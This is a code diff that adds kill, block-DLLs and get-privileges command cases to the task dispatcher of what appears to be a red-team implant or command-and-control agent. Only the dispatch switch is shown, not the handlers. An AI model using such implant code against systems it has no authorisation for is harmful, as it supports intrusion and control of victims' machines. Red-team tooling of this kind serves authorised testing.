@@ -156,6 +156,22 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             return;
         }
 #endif
+#ifdef INCLUDE_CMD_KILL
+        case KILL_CMD:
+        {
+            _dbg("KILL_CMD was called");
+            ProcessKill(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_BLOCKDLLS
+        case BLOCKDLLS_CMD:
+        {
+            _dbg("BLOCKDLLS_CMD was called");
+            ProcessBlockDlls(taskUuid, taskParser);
+            return;
+        }
+#endif
 #ifdef INCLUDE_CMD_GETUID
         case GETUID_CMD:
         {
@@ -185,6 +201,14 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         {
             _dbg("REV2SELF_CMD was called");
             TokenRevert(taskUuid, taskParser);
+            return;
+        }
+#endif
+#ifdef INCLUDE_CMD_GETPRIVS
+        case GETPRIVS_CMD:
+        {
+            _dbg("GETPRIVS_CMD was called");
+            TokenGetPrivs(taskUuid, taskParser);
             return;
         }
 #endif
